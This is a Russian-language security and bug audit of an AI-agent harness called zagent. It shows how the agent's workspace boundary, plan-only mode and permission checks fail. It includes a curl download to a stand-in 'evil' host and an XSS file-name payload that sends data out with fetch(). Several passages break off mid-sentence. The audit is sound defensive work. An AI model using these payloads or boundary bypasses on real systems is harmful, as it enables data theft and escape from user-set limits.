# Аудит кода zagent

Дата: 2026-10-05. Объём: `hub/` (17 модулей), `providers/`, `tools/`, `zagent.bat`,
тесты. Около 9000 строк Python плюс ~1000 строк JS внутри `hub/ui.py`.

Метод: сплошное чтение всех модулей плюс проверка подозрительных мест
исполняемыми пробами. Каждая находка в этом файле **воспроизведена**, кроме
помеченных «не проверено». Формулировки комментариев в коде проверялись
отдельно: расхождения вынесены в раздел 8.

Итог: **5 критических, 22 высоких, 34 средние, 40 низких.**

## 1. Критические и высокие

### 1.0 Ответ агента не доходит до него — вопрос пользователя нельзя закрыть — **CRITICAL**

`hub/worker.py:565-570` + `hub/agent.py:483-507`

`_execute` восстанавливает чекпоинт, а потом зовёт `answer_question()`, но
`restore_checkpoint` заканчивается `_reset_cycle()`, который ставит
`pending_question = None`. А `answer_question()` начинается с
`if self.pending_question is None: return` — и выходит, ничего не записав.

Воспроизведено:

```
pending_question: None
последнее сообщение: assistant | какой файл править?
ответ добавлен? False
```

**Сценарий.** Агент спрашивает «какой файл править?» → задача в статусе `asking`.
Пользователь отвечает → задача возвращается в очередь с `resume_answer` → агент
восстанавливает те же сообщения и продолжает цикл с тем же неотвеченным
вопросом последним сообщением. Модель либо спрашивает снова (бесконечный цикл
вопрос-ответ, и каждый круг стоит целой задачи), либо угадывает.

**Каждый `POST /api/tasks/answer` с текстом — no-op.** Кнопка «одобрить план»
работает, потому что `approve_plan` не проверяет `pending_question`, — именно
это и прячет баг.

**Минимальное исправление:** сохранять `pending_question` в `save_checkpoint()`
и восстанавливать в `restore_checkpoint()` **после** `_reset_cycle()` — тот же
приём, что уже применён к `plan`/`plan_approved` в `agent.py:492-496`.

### 1.0b Режим «только план» не включается — **CRITICAL**

`hub/worker.py:537` против `557-559`

`make_guard(config)` копирует `config.autonomy` в `Guard.autonomy` **по
значению**. Строки 557-559 потом ставят `PLAN` в `config.autonomy`, но
`Agent.run()` смотрит на `self.guard.autonomy` (`agent.py:524`), и туда попало
старое значение.

Воспроизведено:

```
guard.autonomy: Autonomy.NORMAL -> run() входит в режим плана? False
```

**Сценарий.** Галочка «Только план» в интерфейсе (`ui.py:972`) →
`POST /api/tasks {plan_only:true}` → агент **не строит план на одобрение**, а
сразу выполняет инструменты, и задача завершается как `done`, а не `asking`.
Пользователь считает, что поставил разрушительную задачу за заслоном.

**Минимальное исправление:** перенести проверку `plan_only` **выше**
`make_guard` (как правильно сделано в `tools/agent.py:183-184`).

### 1.1 `run_shell` и `image_to_data_url` не могут выполниться никогда — **CRITICAL**

`hub/tools.py:665,668` — `run_tool` безусловно передаёт `kwargs["base"] = base`,
но у `run_shell` (`tools.py:310`) и `image_to_data_url` (`tools.py:418`) параметра
`base` нет. `TypeError` гасится общим `except TypeError` и превращается в
обычную ошибку инструмента.

Воспроизведено:

```
run_shell('echo hello')      -> ok=False, error="Неверные аргументы для run_shell:
                                run_shell() got an unexpected keyword argument 'base'"
image_to_data_url(path=png)  -> ok=False, "... unexpected keyword argument 'base'"
```

**Сценарий.** Агент вызывает `run_shell` и получает вечную ошибку вроде «неверные
аргументы», хотя `base` он не передавал. Причина ему неизвестна, и он тратит шаги
до `max_steps`. Vision-конвейер через `image_to_data_url` мёртв. То же ломает
`tools/agent.py:365`.

**Почему не поймали тесты.** `tests/test_permission.py:235-248` проверяет только
`blocked.ok is False` и `not outside.exists()` — оба условия выполняются **по
неверной причине** (TypeError вместо политики). Тест даёт ложную уверенность.

**Минимальное исправление:** добавить `base: Path | None = None` в `run_shell`
(и переводить в `cwd=base`, если `cwd` не задан), либо не передавать `base`
инструментам, чья сигнатура его не содержит.

### 1.2 `delete_path(".")` удаляет весь воркспейс вместе с `.git` и `.venv` — **CRITICAL**

`hub/tools.py:220-243`. Нет проверки, что цель удаления — корень воркспейса или
его *предок*. Список `protected` применяется к строке пути, а не к содержимому
каталога.

Воспроизведено:

```
run_tool('delete_path', guard, base=ws, path='.', recursive=True)
  -> ok=True, data={'path': '.', 'recursive': True}    # и ws больше не существует
```

**Сценарий.** Агент решил «прибраться» и удалил рабочую директорию целиком. Всё
пропало за один шаг, инструмент отчитался об успехе. Прямо противоречит
собственному докстрингу `Guard` (`autonomy.py:124-127`: «защита от того, чтобы
агент снёс сам себя»).

**Минимальное исправление:** в `delete_path` отказывать, если цель — корень
воркспейса или содержит его. Лучше — в `Guard`, чтобы нельзя было обойти через
псевдоним.

### 1.3 Нераспарсенный вызов инструмента превращается в успешный ответ — **CRITICAL**

`hub/agent.py:685,693-724`. `parse_tool_calls` возвращает `[]` для всего, что не
строгий JSON (одинарные кавычки, питоновские словари, обрезанный JSON, висячие
запятые), а `_one_step` считает отсутствие вызовов ответом словами и завершает
задачу успешно.

Воспроизведено:

```
parse_tool_calls("Сейчас прочитаю: {'tool': 'read_file', 'args': {'path': 'x.py'}}")
  -> []
```

**Сценарий.** Модель отвечает питоновским словарём (обычное дело) или JSON с
запятой. Агент записывает шаг, шлёт `{"type":"done"}`, ставит `finished=True` и
возвращает `{"ok": True}` — **ничего не прочитано и не записано**. Ошибка
разбора нигде не логируется, модель не узнаёт, что формат неверен. Худший из
исходов: тихий ложный успех.

**Минимальное исправление:** отличать «JSON нет вовсе» от «JSON-подобное, но не
распарсилось»; во втором случае возвращать модели требование строгого формата
вместо завершения задачи. Опционально — запасной разбор через
`ast.literal_eval`.

### 1.4 `edit_file` безмолвно портит редактируемый файл — **HIGH**

`hub/tools.py:180,211`: `read_text(errors="replace")` + `write_text(newline="\n")`.

1. `errors="replace"` превращает каждый нечитаемый байт в `�`, и эти замены
   **записываются обратно**.
2. `read_text` переводит CRLF→LF в памяти, `write_text(newline="\n")` пишет LF.
   Весь файл переписывается с LF даже при правке одной строки.

Воспроизведено на файле `b'a = 1\r\n# <latin-1>\r\nb = 2\r\n'`:

```
before: b'a = 1\r\n# \xe4\xf0\xe8\xe2\xe5\xf2\r\nb = 2\r\n'
after : b'a = 1\n# \xef\xbf\xbd...\n\xef\xbf\xbd\nb = 3\n'
```

Инструмент отчитался `ok=True`.

**Сценарий.** В Windows агент правит одну строку в файле с CRLF — git показывает
изменённым весь файл. Если в файле был комментарий в cp1251, все не ASCII
символы уничтожены. Оба случая тихие.

**Минимальное исправление:** читать и писать байты (или `newline=""` с обеих
сторон) и прерываться на `UnicodeDecodeError`.

### 1.5 Проверка границы в `run_shell` фактически не работает — **HIGH**

`hub/tools.py:458-496`. Воспроизведено:

| команда | извлечённые кандидаты | итог |
|---|---|---|
| `curl http://evil/x -o C:/Windows/System32/evil.dll` | вся команда как **относительный** путь | **разрешено** |
| `git clone http://x C:/outside/repo` | то же | **разрешено** |
| `tar -cf C:/out/a.tar .` | то же | **разрешено** |
| `mkdir C:/NewFolderOutside` | `[]` | проверки нет вовсе |
| `copy /y in.txt C:/Windows/System32/x.dll` | `[]` | проверки нет вовсе |
| `robocopy . C:/backup /MIR` | `[]` | проверки нет вовсе |
| `echo hi > "C:/Program Files/x.txt"` | `C:\Program` | **ложный отказ** |

Причины: (а) ветка «непрозрачной команды» передаёт **всю строку команды** в
`_absolute_guess`, который разрешает её относительно `base` — то есть всегда
«внутри» и всегда проходит; (б) извлекаются только `>`/`>>`/`--output`, причём
регексп написан как `--(?:output|out-file|-o)`, так что форма `-o` не может
совпасть; (в) токен обрывается на первом пробеле, поэтому путь с пробелом
обрезается.

Прямо противоречит комментарию `tools.py:606-607` («иначе границу обойдёт одна
строка в команде»).

**Сейчас это замаскировано находкой 1.1** — оболочка падает с TypeError раньше,
чем может навредить. **Чинить 1.1 первым**: после этого §1.5 станет живым.

**Минимальное исправление:** для непрозрачных команд не угадывать путь, а
возвращать признак «нужно разрешение»; добавить `-o`/`-o<dir>` и обработку
кавычек в извлекателе.

### 1.6 `self.verifications` не очищается — одна плохая запись портит всю задачу — **HIGH**

`hub/agent.py:743-749` против `_reset_cycle` в `agent.py:457-466`.
`_reset_cycle` сбрасывает `steps`, `phase`, `pending_*`, `plan*`, `finished`,

проверять только отчёты, полученные **на этом** шаге.

### 1.8 Лишний аргумент в вызове инструмента роняет весь прогон — **HIGH**

`hub/agent.py:808`: `run_tool(name, self.guard, base=self.workspace, **args)` —
`args` приходит прямо от модели. Если модель пришлёт `"base"` (вполне вероятно:
ей сообщают про рабочую директорию), Python падает **до** входа в тело
`run_tool`, а значит и до её `except`.

Воспроизведено:

```
asyncio.run(agent._run_tool({'tool':'read_file','args':{'path':'x.txt','base':'.'}}, 'm'))
  -> TypeError: hub.tools.run_tool() got multiple values for keyword argument 'base'
```

Ни `_run_tool`, ни `_one_step`, ни `run` это не ловят: задача умирает трейсбеком
вместо `{"ok": false}` — несмотря на комментарий `tools.py:671` («инструмент не
должен ронять агента»), который покрывает только внутренний вызов.

**Минимальное исправление:** фильтровать аргументы по сигнатуре инструмента до
передачи и обернуть сам вызов в `try/except Exception`.

### 1.9 `shift` не действует на `%*` — 9 из 15 команд `zagent.bat` сломаны — **CRITICAL**

`zagent.bat:32-36`:

```bat
set "CMD=%~1"
if not defined CMD set "CMD=ui"
if /i not "%CMD%"=="ui" shift
```

`%1` сдвигается, **`%*` — нет**: `SHIFT` двигает `%0`–`%9` и никогда `%*`.
Воспроизведено на отдельном bat-файле:

```
BEFORE  arg1=[ask]        star=[ask "my question"]
AFTER   arg1=[my question] star=[ask "my question"]   <-- %* не изменился
```

Каждая ветка, передающая `%*`, заново передаёт имя команды первым аргументом в
подпарсер `argparse`:

| команда | фактически выполняется | результат |
|---|---|---|
| `zagent.bat ask "вопрос"` | `agent.py ask ask "вопрос"` | `unrecognized arguments` — exit 2 |
| `zagent.bat agent "задача"` | `agent.py agent "задача"` | `invalid choice: 'agent'` — exit 2 |
| `zagent.bat sanity` | `agent.py sanity sanity` | exit 2 |
| `zagent.bat consult "вопрос"` | `agent.py consult consult "…"` | exit 2 |
| `zagent.bat connect opencode` | `connect_guide.py connect opencode` | `invalid choice` — exit 2 |
| `zagent.bat export opencode` | `cli.py export export opencode` | exit 2 |
| `zagent.bat ws list` | `workspace.py ws list` | `invalid choice: 'ws'` — exit 2 |
| `zagent.bat ui` / `web` | `serve.py ui` | `unrecognized arguments: ui` — exit 2 |
| `zagent.bat` (двойной клик) | `serve.py` | ✅ работает |
| `check`, `modes`, `ping`, `test`, `help` | не передают `%*` | ✅ работают |

Проверено на настоящем bat:

```
> zagent.bat ask "2+2"
agent.py: error: unrecognized arguments: 2+2
exit: 2
```

**Сценарий.** Пользователь следует README и набирает `zagent.bat ask "сколько
будет 2+2"`. Получает дамп usage на 15 строк, который читается как «у тебя
неправильные кавычки», он пробует переставить кавычки и сдаётся. Задеты 9 из 15
команд, включая `agent` — основной неинтерактивный вход.

**Почему не заметили:** работает двойной клик, а он идёт без `%*`.

**Минимальное исправление:** собрать хвост аргументов циклом (потому что `%*`
не поддаётся постобработке) и заменить `%*` на `%REST%`:

```bat
set "CMD=%~1"
if not defined CMD set "CMD=ui"
set "REST="
:collectargs
if "%~1"=="" goto :argsready
set "REST=%REST %1"
shift
goto :collectargs
:argsready
```

Заодно: `zagent.bat:124` зовёт `tools\agent.py run %REST%`, поскольку
неявного `run` у `agent.py` нет.

### 1.11 `esc()` небезопасен внутри inline-`onclick` — XSS через имена файлов — **HIGH**

`hub/ui.py:549-550` — корректный экранировщик HTML-текста, но **не** JS-строки
внутри HTML-атрибута: парсер HTML декодирует `&#39;` обратно в `'` **до** сборки
обработчика в JavaScript.

Используется 10 раз, например `ui.py:745`:

```js
`<div class="fitem" onclick="openEntry('${esc(full)}',${e.type==='dir'})">`
```

где `full` строится из `e.name` — реального имени файла в воркспейсе.

**Сценарий.** Агент создаёт файл с именем
`x'+fetch('/api/shot',{method:'POST'}).then(r=>r.text()).then(t=>fetch('https://evil/?'+t))+'`.
Имя экранируется в `x&#39;+fetch(...)&#39;`, браузер декодирует обратно в `'`, и
обработчик превращается в `openEntry('x'+fetch(...)+'',false)`. Клик по файлу
выполняет произвольный JS в origin `127.0.0.1:8783`, откуда читается
`/api/state` (ключи API в открытом виде) и вызывается `POST /api/tasks` с
`--access 3`. CSP не задан.

**Даже без злого умысла** имя с `'` (допустимо в NTFS) даёт
`SyntaxError` при клике — то есть молча мёртвую запись в дереве.

**Минимальное исправление:** делегированный обработчик через
`data-*` атрибуты вместо интерполяции в `onclick`.

### 1.13 Переключатель «жёсткая граница» молча не применялся — **HIGH**

`hub/server.py:296-297` — `soft_boundary` отсутствовал в белом списке
`_config`, поэтому значение отбрасывалось, а ответ был `{"ok": true}`.

**Сценарий.** Пользователь выбирает «жёсткая — выход невозможен», считает, что
агент заперт в папке, и уходит. Агент остаётся в мягком режиме и покажет окно
разрешения. Единственный симптом — select откатывается на следующем `refresh()`.
Отказ в **опасную** сторону: пользователь believes более сильную границу, чем
есть.

**Состояние на момент аудита: исправлено.** `soft_boundary` добавлен в список.
Проверено переключением `True → False → True` через API.

### 1.14 `fetch()` вне `try` — интерфейс умирает молча — **HIGH**

`hub/ui.py:552-559`: `try/catch` накрывает только `r.json()`. Сам `fetch()` вне
него, глобальных обработчиков нет, `.catch()` нет ни у одного из ~20 вызовов.

**Сценарий.** Пользователь закрывает `tools\serve.py`. Следующий тик
`setInterval` реджектится, в консоли одна необработанная ошибка, **панель
замирает с последним известным состоянием без единого признака устаревания**, и
все последующие действия падают так же. Панель выглядит живой и не является.

Конкретные случаи:
- `refresh().then(() => loadSession())` — если `refresh()` отклонился,
  `loadSession()` не выполнится и **история сессии не восстановится никогда**.
- `decidePermission()` **игнорирует ответ** POST: при ошибке 500 интерфейс всё
  равно тостует «Разрешено», а агент остаётся заблокирован навсегда.

**Минимальное исправление:** завернуть `fetch` в `try`, добавить
`unhandledrejection` и проверять `r.ok` там, где результат важен.

### 1.15 SSE-фильтр по сессии не может выполнить свою задачу — **HIGH**

`hub/ui.py:1051` с комментарием «Чужая сессия в переписке — помеха». Условие —
`if (e.session_id && …)`, то есть фильтр ловит **только** события, у которых

**Сценарий.** Ставим длинную задачу в сессии A, переключаемся на B. История B

`session_id` для фильтра.

**Минимальное исправление:** проставлять `session_id` в `Worker.emit()` для
каждого события (доступен через `task_id`), затем фильтровать строго.

## 2. `zagent.bat`

### 2.0 Таймаут 30 минут не отменяет задачу — два агента работают одновременно — **HIGH**

`hub/worker.py:588`: `.result(timeout=1800)` бросает `TimeoutError`, но
**не отменяет корутину**. `loop_forever` помечает задачу `failed`, чистит
`current_task_id`, и цикл берёт следующую — осиротевшая корутина при этом
продолжает звать модели и **писать файлы**.

Воспроизведено по коду; худший случай: `max_steps` 40 × `step_timeout` 120 с =
4800 с при таймауте 1800 с.

**Минимальное исправление:** сохранить future и звать `future.cancel()` при
таймауте. Тот же дефект в `run()` (`worker.py:1124-1128`) и `_run`
(`server.py:602-609`).

### 2.0b Отмена теряется между `claim_task` и `self._agent = agent` — **HIGH**

`hub/worker.py:496, 516, 553`

`cancel()` доставляет флаг только через `self._agent.request_cancel()`, а БД-флаг
невидим, потому что `_execute` работает из устаревшего словаряка `task`.

**Сценарий.** `POST /api/tasks/cancel` приходит во время сборки guard/агента.
`current_task_id` совпадает, но `self._agent is None` → флаг не доставлен, а
позже `next_payload["cancel"] = False` затирает его. Задача **доиграет до конца**,
хотя `cancel_task` вернул `True` и интерфейс отчитался об успехе.

**Минимальное исправление:** перечитать задачу из БД внутри `_execute` после
claim, либо держать `self._cancel_requested: set[int]`.

### 2.0c Повторный ответ на разрешение перезапускает завершённую задачу — **HIGH**

`hub/worker.py:716-754`, `hub/store.py:634-650`

`decide_permission` проверяет только `get_permission(...) is None` и никогда не
требует `status = 'pending'`. `answer_permission` безусловно ставит задачу в
`queued`.

Воспроизведено:

```
answer2 на решённом запросе -> ok: True ... status: denied
статус задачи после answer2: queued   # задача уже была done

t3 после cancel: cancelled
ответ на снятый запрос -> ok: True, status: granted
t3 воскрешён в: queued                # ОТМЕНЁННАЯ задача снова ожила
```

**Два сценария.** (а) Пользователь дважды жмёт «Разрешить» (две вкладки, повтор
запроса) — второй ответ **переворачивает решение в отказ** и возвращает в
очередь задачу `done`, которая заново проходит весь диалог с чекпоинта: повторные
записи файлов, повторные команды. (б) Пользователь отменяет задачу и жмёт кнопку
в ещё открытом окне — задача воскресает и выполняется, хотя отменена.

**Минимальное исправление:** `UPDATE ... WHERE id=? AND status='pending'` и
`return None` при `rowcount == 0`; возвращать задачу в очередь только из
`waiting_permission`.

### 2.0d Запрос на разрешение может пережить свою задачу навсегда — **HIGH**

`hub/worker.py:593-610` против `612-621`

`add_permission()` коммитится раньше, чем статус задачи меняется на
`waiting_permission`. Убей процесс между ними — задача останется `running` с
`pending`-запросом. При перезапуске `_bootstrap` помечает `running → failed`,
но `stranded_permission_tasks()` смотрит **только** на `waiting_permission`.

**Результат:** `pending_permissions()` возвращает его навсегда → окно разрешения
в интерфейсе залипает на `failed`-задаче, а ответ на него (п. 2.0c) снова ставит
задачу в очередь.

**Минимальное исправление:** создавать запрос только после вычисления статуса и
пропускать при `cancelled`, плюс подчистка при старте.

### 2.0e `POST /api/ask` всегда отдаёт 500 — **HIGH**

`hub/server.py:602-609`

`_run()` читает атрибут `Handler.api` **базового класса**, а `serve()` задаёт

### 2.0h `base_dir` из `/api/config` не проверяется → `/api/files` читает любой файл — **HIGH**

## 3. Интерфейс

### 3.1 `since=0` при каждой загрузке шлёт до 400 запросов — **HIGH**

`hub/ui.py:1044` начинает поток с `lastEvent = 0`, поэтому сервер отдаёт **200
самых старых** сохранённых событий (включая чужие прошлые сессии). Каждое
событие чужой сессии зовёт **не-awaited** `refresh()` — то есть ещё и `GET
/api/state` плюс `POST /api/permissions`.

**Сценарий.** Перезагрузка панели при длинной истории: до 200 событий backlog
порождают ~400 параллельных HTTP-запросов, и 100+ чужих `step`/`finished`
дописываются в `#msgs` без `session_id`, по которому можно их отфильтровать.

**Минимальное исправление:** хранить последний id события в `sessionStorage`,
фильтровать сервером, а повторный `refresh()` — дебаунсом.

### 3.2 Дублирование событий при переподключении — **MEDIUM**

`hub/server.py:174-183`: `subscribe()` вызывается **до** `events_since()`.
Событие, попавшее в это окно, отдаётся дважды. На клиенте нет дедупликации.

**Минимальное исправление:** `if (e.id && e.id <= lastRendered) return;` и
`subscribe()` после выгрузки backlog.

### 3.3 Кнопка «копировать инструкцию» мертва из-за переносов строк — **MEDIUM**

`hub/ui.py:716`: многострочная инструкция попадает в `onclick` внутри
однострочного литерала → `SyntaxError` при первом клике, ошибка гасится, кнопка
молча не работает, а запасной путь сообщает об успехе.

### 3.4 Битый `localStorage` убивает весь интерфейс при старте — **MEDIUM**

`hub/ui.py:601,628`: `JSON.parse` без `try` в верхнеуровневом IIFE, до стартового
блока. Одно необработанное исключение отменяет остаток `<script>`: нет дерева
файлов, нет состояния, нет SSE, нет опроса — только мёртвая панель.

### 3.5 Перетаскивание может заклинить и схлопнуть центр — **MEDIUM**

- `ui.py:616,625,602` — клампы в абсолютных пикселях и сохранение ширины в
  `localStorage` **без проверки окна**. На экране 1280 px сумма минимальных ширин
  (620+780+10) больше ширины окна, и центральная панель схлопывается в 0 px
  **навсегда** — до F5. Панель, растянутая на мониторе 1920 px, ломается на
  ноутбуке.
- `ui.py:632-633` — нет выхода по `blur`/`pointercancel`. Если отпустить
  перетаскивание над другим окном, `body.resizing` остаётся: страница
  становится невыделяемой, а все iframe мертвы до перезагрузки. Touchscreen не
  поддержан вовсе.

### 3.6 Полная sanity-проверка упирается в 600 с и блокирует очередь — **MEDIUM**

`hub/worker.py:844,974`: 40 моделей × 90 с = 3600 с потолком, а `run()` ждёт
600 с → `TimeoutError` → HTTP 500 → интерфейс показывает «Проверено undefined»
после десяти минут тишины. Побочно: корутина идёт **в loop воркера**, то есть
на всё это время встаёт очередь задач.

### 3.7 Прочее в интерфейсе — **LOW**

- `#visionChk` (`ui.py:439`) не читается нигде: галочка ничего не делает.
- Результаты sanity рисуются в скрытую правую вкладку, а кнопка — в левой.

- `setInterval` использует `.hidden`, которое никто не выставляет, так что опрос

### 3.8 Проверено и признано правильным

Нулевые ссылки на несуществующие id (проверено механически), все inline-обработчики

## 4. Многопоточность и состояния

### 4.1 SSE-подписки живут вечно — **MEDIUM**

`hub/server.py:155-202`. Подписка отменяется только в `finally` при обрыве
сокета. Клиент, который молча не читает поток, держит поток и очередь в памяти
вечно. Клиентских `finally` в `hub/ui.py:connect` нет — ни при закрытии вкладки,
ни при перезагрузке.

### 4.2 `refresh()` из обработчика событий переписывает более свежий снимок — **MEDIUM**

`hub/ui.py:1051` зовёт `refresh()` без ожидания и без защиты от гонки. Два
перекрывающихся вызова могут вернуться не по порядку, и `S` откатится к более
старому снимку — на экране мигнёт выделение сессии и счётчики очереди.

### 4.3 Проверено и признано правильным

`Store` защищён `RLock` и оборачивает запись с commit; `claim_task` атомарен
через `WHERE status = 'queued'` и корректно отказывает при гонке; `next_queued_task`
не подхватывает задачи в статусе `waiting_permission` (это правильно — иначе
задача зациклилась бы); `drop_permissions` при отмене снимает висящий запрос;
`stranded_permission_tasks` чинит задачи, чей запрос потерян; `list_tasks`
различает `""` (нет сессии) и `None` (не фильтровать); миграция колонок идемпотентна
и безопасна на старой базе; `zip(batch, outcomes)` корректен, потому что
`asyncio.gather` сохраняет порядок.

## 7. Что проверено и оказалось правильным

Чтобы отчёт был проверяемым:

- **Граница воркспейса.** Сравнение по компонентам, регистронезависимое, через
  `_inside`. Никакой префиксной ошибки: `_inside("…/zws", "…/zws-evil/x")` → False.
  `../` и абсолютные внешние пути нормализуются **до** проверки, симлинки тоже.
  Буквы дисков и UNC приводятся к одной форме. Приоритет отказа верен: явный
  отказ пользователя перекрывает мягкую границу и при этом **не действует внутри**
  воркспейса. `grant_path` намеренно не расширяет `write_roots` — иначе разрешение
  на один файл открыло бы весь диск.
- **Соглашение о префиксе разрешения.** `PERMISSION_PREFIX` рождается ровно в
  одном месте и потребляется только через `is_permission_request`/`permission_question`.
  Остальные две ветки отказа префикс не несут, поэтому их нельзя спутать с
  вопросом «да/нет».
- **Проверка пути до выполнения.** `run_tool` разрешает путь, зовёт `check_path` и
  **возвращается раньше** `spec["fn"]`. Порядок: неизвестный инструмент → уровень
  доступа → эскалация → путь → выполнение. Оговорки выше (извлечение путей из
  команды, `screenshot`).
- **Изменяемых аргументов по умолчанию нет** — везде `default_factory`.
- **Сравнения enum через `is`** — везде по настоящим членам; `AccessLevel` —
  `IntEnum`, так что `<` в `check_access` корректен.
- **Балансировка скобок в `_scan_json_objects`** — верна, включая `while/else` на
  незакрытую скобку; терминируется.
- **Нет потерянных `await`** в проверенных модулях; `consult` закрывает клиент в
  `finally`; `run_shell` ограничивает вывод и вешает таймаут.
- **`_force_utf8` в CLI** — работает верно и действительно нужен при
  перенаправлении в файл, включая `zagent.bat export … > opencode.jsonc`.
- **Состояние SQLite переживает перезапуск**: сессии, карантины, чекпоинты,
  запросы на доступ. Миграции идемпотентны.
- **`_bootstrap` переживает битый конфиг**: сессия всё равно создаётся, чтобы
  интерфейс показал ошибку, а не остался пустым.
- **Полный доступ при мягкой границе выходит наружу без вопроса** — так задумано
  по вашей просьбе, и код с системным промптом согласованы. Несогласованы только
  два докстринга (см. §8).
- **Интерфейс**: 400+ тестов проходят, включая 35 на доступность из региона.
